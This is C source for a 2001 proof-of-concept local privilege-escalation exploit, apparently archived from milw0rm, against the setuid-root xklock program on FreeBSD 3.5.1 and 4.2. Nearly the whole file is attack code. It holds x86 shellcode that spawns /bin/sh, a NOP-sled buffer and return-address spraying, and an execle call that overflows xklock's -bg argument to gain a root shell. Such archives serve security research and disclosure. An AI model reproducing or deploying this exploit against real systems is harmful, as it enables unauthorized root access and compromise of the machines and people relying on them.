/*
 * xklock - FreeBSD 3.5.1 & 4.2 ports package local root exploit
 * 
 * The X key lock program contain several exploitable buffer overflows
 * in command line arguments aswell as the 'JNAME' environment variable.
 * xklock is installed setuid root by default.
 * This POC exploit (ab)uses the -bg arg, brute force offset if required.
 *
 * Usage: ./exklock <offset>
 *
 * dethy@synnergy.net // www.synnergy.net
 * 20 Feb 2001.
 *
 */ 

#include <stdio.h>
#include <stdlib.h>

#define EGGSIZE 1024
#define RETSIZE 264
#define NOP 0x90
#define OFFSET 0

char shellcode[]= // execve() freebsd x86
	"\xeb\x37\x5e\x31\xc0\x88\x46\xfa\x89\x46\xf5\x89\x36\x89\x76"
	"\x04\x89\x76\x08\x83\x06\x10\x83\x46\x04\x18\x83\x46\x08\x1b"
	"\x89\x46\x0c\x88\x46\x17\x88\x46\x1a\x88\x46\x1d\x50\x56\xff"
	"\x36\xb0\x3b\x50\x90\x9a\x01\x01\x01\x01\x07\x07\xe8\xc4\xff"
	"\xff\xff\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02"
	"\x02\x02\x02/bin/sh.-c.sh";


u_long get_sp(void) { __asm__("movl %esp,%eax"); }

int main(int argc, char *argv[]) {
 char egg[EGGSIZE], ret[RETSIZE];
 int i, eggsize = EGGSIZE, retsize = RETSIZE, nop = NOP, offset=OFFSET;
 long *address;
  
 if(argc > 1){ offset = atoi(argv[1]); }
 (char *)address = get_sp - offset;
 fprintf(stderr, "Using addr: 0x%x\n", address);

 memset(egg, nop, eggsize);
 memcpy(egg+(eggsize - strlen(shellcode) - 1), shellcode, strlen(shellcode));
 for(i=0; i < retsize; i+=4) *(int *)&ret[i]=address;

 if(execle("/usr/local/bin/xklock", egg, "-bg", ret, NULL, NULL)) {
  fprintf(stderr,"Unable to execute /usr/local/bin/xklock\n");
  exit(1);
 }
}


// milw0rm.com [2001-03-03]